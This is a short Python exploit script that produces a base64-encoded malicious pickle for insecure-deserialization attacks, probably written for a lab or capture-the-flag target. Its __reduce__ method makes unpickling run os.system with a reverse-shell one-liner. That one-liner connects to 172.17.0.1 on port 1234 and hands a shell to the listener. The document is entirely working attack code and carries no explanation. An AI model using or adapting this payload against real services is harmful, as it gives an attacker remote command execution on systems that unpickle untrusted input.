import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ("python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"172.17.0.1\",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'")
        # cmd = ('whoami')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))